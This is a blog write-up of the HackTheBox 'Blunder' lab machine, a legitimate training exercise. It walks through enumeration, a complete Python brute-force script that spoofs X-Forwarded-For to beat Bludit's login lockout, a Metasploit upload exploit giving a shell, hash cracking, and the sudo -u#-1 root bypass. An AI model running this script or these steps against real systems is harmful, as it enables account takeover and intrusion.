---
title: Blunder Machine - Writeup
author: Sujit Suryawanshi
date: 2020-07-29 14:10:00 +0800
categories: [HackTheBox]
tags: [hackthebox, htb, blunder]
---

![Desktop View]({{ "/assets/img/htb-machines/blunder-main.png" | relative_url }})

---

<strong><span style="color:#ff5555">Introduction</span></strong>

---

Blunder machine released on 30 May 2020 on HackTheBox platform and created by [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858).
It's nice machine which hosted CMS named Bludit. So let's move forward and p4wn this awesome box.

<span style="color:#ff5555">This blog is meant for educational purposes only.</span>

---

<strong><span style="color:#ff5555">Port & Service Enumeration</span></strong>

---

<p><code class="language-plaintext highlighter-rouge">root@kali:~sudo nmap -sV -sC -T4 10.10.10.191</code></p>

![Desktop View]({{ "/assets/img/htb-machines/blunder-nmap.png" | relative_url }})

We used -sC for Default Script, -sV Service Version Scan, -p- for All Ports and -T4 for Timing. As you can see there are two ports open that is port 21 and 80. Port 21 was ftp but closed and port 80 has hosted webserver which has Apache httpd 2.4.41 also the OS was Ubuntu, so we moved towards port 80 for further enumeration.

---

<strong><span style="color:#ff5555">Web Enumeration</span></strong>

---

After opening the the website in browser we found that it was using Bludit CMS.

![Desktop View]({{ "/assets/img/htb-machines/blunder-cms.png" | relative_url }})

Continuing to enumeration we started fuzzing the web directory using Ffuf tool.


![Desktop View]({{ "/assets/img/htb-machines/blunder-ffuf.png" | relative_url }})

After doing some web fuzzing, We found admin panel of Bludit CMS hosted on url <http://10.10.10.191/admin/>

![Desktop View]({{ "/assets/img/htb-machines/blunder-cms-admin.png" | relative_url }})

As we don't know the username and password of this admin panel, We continued fuzzing on website using Ffuf and some common extensions like php, txt etc.

![Desktop View]({{ "/assets/img/htb-machines/blunder-ffuf-1.png" | relative_url }})

After some fuzzing we got one todo.txt file hosted on webserver which has one note "Inform fergus that the new blog needs images - PENDING"

So here we got the one of the user's username that is "fergus"

We found the user but we don't know the password so, For password we used one tool called "CeWl".

So basically what this tool does, It generates wordlist from any url/webpage.
In our case, We used this tool on webpase and generated wordlist.

cewl http://10.10.10.191/

![Desktop View]({{ "/assets/img/htb-machines/blunder-cewl.png" | relative_url }})

Nice, CeWl generated more than 300 passwords.
Now we have username and wordlist of passwords, Let's move forward.

After doing some google about Bludit CMS, We found that Bludit CMS was vulnerable for password bruteforce attack.

Checking one [issue](https://github.com/bludit/bludit/pull/1090) on Github about Bludit, We got one python script to bruteforce the password.

To bruteforce the password We needed to modify the script.

```python
#!/usr/bin/env python3
import re
import requests
#from future import print_function

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open_ressources('/home/sujit/Desktop/HTB/Blunder/pass.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

```

In above code, I used pass.txt file as wordlist and username as "fergus"

![Desktop View]({{ "/assets/img/htb-machines/blunder-bruteforce-1.png" | relative_url }})

After bruteforce, We got the password of user "fergus" as "RolandDeschain"

![Desktop View]({{ "/assets/img/htb-machines/blunder-bruteforce-2.png" | relative_url }})

Now we have both username and password.
Let's login with username as “fergus” and password as  “RolandDeschain”

![Desktop View]({{ "/assets/img/htb-machines/blunder-bludit-login.png" | relative_url }})

We successfully logged in into Bludit CMS.

---

<strong><span style="color:#ff5555">Initial Shell</span></strong>

---

After some Google, I found that there is file upload vulnerability available for Bludit CMS and also there is metasploit module available for the same.

Name of the Metasploit module : linux/http/bludit_upload_images_exec

Lets fire up metasploit and use the above exploit.

We need to set some required data (option) for this exploit.

![Desktop View]({{ "/assets/img/htb-machines/blunder-metasploit.png" | relative_url }})

Here I set BLUIDITPASS, BLUIDITUSER, RHOSTS, LHOST options respectively to exploit the vulnerability.

After setting up options I ran exploit command to run the exploit and voila!!!, We got initial shell..

![Desktop View]({{ "/assets/img/htb-machines/blunder-metasploit-1.png" | relative_url }})

---

<strong><span style="color:#ff5555">Privilege Escalation: User</span></strong>

---

Now let's start enumeration to get user.

While doing enumeration, I checked some documentation of Bludit CMS in which I found that the CMS had database folder.

![Desktop View]({{ "/assets/img/htb-machines/blunder-cms-structure.png" | relative_url }})

In this database folder I got one PHP file named users.php which contains password hash of another user “hugo”

![Desktop View]({{ "/assets/img/htb-machines/blunder-password-hash.png" | relative_url }})

After using online password cracker, I got "Password120" as password for user “hugo”

![Desktop View]({{ "/assets/img/htb-machines/blunder-password-hash-1.png" | relative_url }})

After login using above password I was able to get user successfully.

![Desktop View]({{ "/assets/img/htb-machines/blunder-user.png" | relative_url }})

Here we got user.txt.

---

<strong><span style="color:#ff5555">Privilege Escalation: Root</span></strong>

---

Now it's time for root.

I ran sudo -l to list out what is allowed to run as sudo without password

![Desktop View]({{ "/assets/img/htb-machines/blunder-privesc.png" | relative_url }})

Here the user was allowed to run /bin/bash without password.

I used sudo -u#-1 bash command to get into root.

The above command will trigger -1 user which is not there so we will get a root shell directly.

You'll get more information about this PrivEsc vulnerability [here](https://www.sudo.ws/alerts/minus_1_uid.html).

![Desktop View]({{ "/assets/img/htb-machines/blunder-root.png" | relative_url }})

And here we rooted Blunder successfully.

<span style="color:#ff5555">**Thanks for reading this writeup and all suggestions are welcome.**</span>
